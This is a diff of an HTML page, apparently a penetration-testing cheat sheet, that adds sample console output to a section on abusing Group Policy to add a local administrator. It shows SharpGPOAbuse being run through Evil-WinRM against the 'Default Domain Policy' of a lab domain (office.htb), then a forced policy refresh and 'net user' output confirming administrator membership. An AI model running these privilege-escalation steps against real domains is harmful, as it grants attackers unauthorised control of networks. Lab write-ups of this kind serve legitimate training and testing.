@@ -321,10 +321,67 @@ body.dark-mode #dynamicFormContainer button:hover {
   <h3 id="abuse-1-add-local-admin">Abuse #1: Add local admin</h3>
 <h4 id="1-list-gpos-name">1. List GPOs Name</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Get-GPO -All | Select-Object DisplayName
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\HHogan\Documents&gt; Get-GPO -All | Select-Object DisplayName
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">DisplayName
+</span></span></span><span class="line"><span class="cl"><span class="go">-----------
+</span></span></span><span class="line"><span class="cl"><span class="go">Windows Firewall GPO
+</span></span></span><span class="line"><span class="cl"><span class="go">Default Domain Policy
+</span></span></span><span class="line"><span class="cl"><span class="go">Default Active Directory Settings GPO
+</span></span></span><span class="line"><span class="cl"><span class="go">Default Domain Controllers Policy
+</span></span></span><span class="line"><span class="cl"><span class="go">Windows Update GPO
+</span></span></span><span class="line"><span class="cl"><span class="go">Windows Update Domain Policy
+</span></span></span><span class="line"><span class="cl"><span class="go">Software Installation GPO
+</span></span></span><span class="line"><span class="cl"><span class="go">Password Policy GPO
 </span></span></span></code></pre></div><h4 id="2-add-localadmin">2. Add localAdmin</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\SharpGPOAbuse.exe --AddLocalADmin --UserAccount &lt;USER&gt; --GPOName &lt;GPO_NAME&gt;
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\SharpGPOAbuse.exe --AddLocalADmin --UserAccount &#39;&lt;USER&gt;&#39; --GPOName &#39;&lt;GPO_NAME&gt;&#39;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\HHogan\Documents&gt; .\SharpGPOAbuse.exe --AddLocalADmin --UserAccount &#39;HHogan&#39; --GPOName &#39;Default Domain Policy&#39;
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Domain = office.htb
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Domain Controller = DC.office.htb
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Distinguished Name = CN=Policies,CN=System,DC=office,DC=htb
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] SID Value of HHogan = S-1-5-21-1199398058-4196589450-691661856-1108
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] GUID of &#34;Default Domain Policy&#34; is: {31B2F340-016D-11D2-945F-00C04FB984F9}
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] File exists: \\office.htb\SysVol\office.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] The GPO does not specify any group memberships.
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] versionNumber attribute changed successfully
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] The version number in GPT.ini was increased successfully.
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Done!
 </span></span></span></code></pre></div><h4 id="3-force-reload">3. Force reload</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">gpupdate /force
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\HHogan\Documents&gt; gpupdate /force
+</span></span></span><span class="line"><span class="cl"><span class="go">Updating policy...
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Computer Policy update has completed successfully.
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">User Policy update has completed successfully.
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">*Evil-WinRM* PS C:\Users\HHogan\Documents&gt; net user HHogan
+</span></span></span><span class="line"><span class="cl"><span class="go">User name                    HHogan
+</span></span></span><span class="line"><span class="cl"><span class="go">Full Name
+</span></span></span><span class="line"><span class="cl"><span class="go">Comment
+</span></span></span><span class="line"><span class="cl"><span class="go">User&#39;s comment
+</span></span></span><span class="line"><span class="cl"><span class="go">Country/region code          000 (System Default)
+</span></span></span><span class="line"><span class="cl"><span class="go">Account active               Yes
+</span></span></span><span class="line"><span class="cl"><span class="go">Account expires              Never
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Password last set            5/6/2023 11:59:34 AM
+</span></span></span><span class="line"><span class="cl"><span class="go">Password expires             Never
+</span></span></span><span class="line"><span class="cl"><span class="go">Password changeable          5/7/2023 11:59:34 AM
+</span></span></span><span class="line"><span class="cl"><span class="go">Password required            Yes
+</span></span></span><span class="line"><span class="cl"><span class="go">User may change password     Yes
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Workstations allowed         All
+</span></span></span><span class="line"><span class="cl"><span class="go">Logon script
+</span></span></span><span class="line"><span class="cl"><span class="go">User profile
+</span></span></span><span class="line"><span class="cl"><span class="go">Home directory
+</span></span></span><span class="line"><span class="cl"><span class="go">Last logon                   5/10/2023 5:30:58 AM
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Logon hours allowed          All
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Local Group Memberships      *Administrators       *Remote Management Use
+</span></span></span><span class="line"><span class="cl"><span class="go">Global Group memberships     *Domain Users         *GPO Managers
+</span></span></span><span class="line"><span class="cl"><span class="go">The command completed successfully.
 </span></span></span></code></pre></div><p><small><em>Ref: <a href="https://github.com/FSecureLABS/SharpGPOAbuse">SharpGPOAbuse</a></em></small></p>
 
 </div></div>
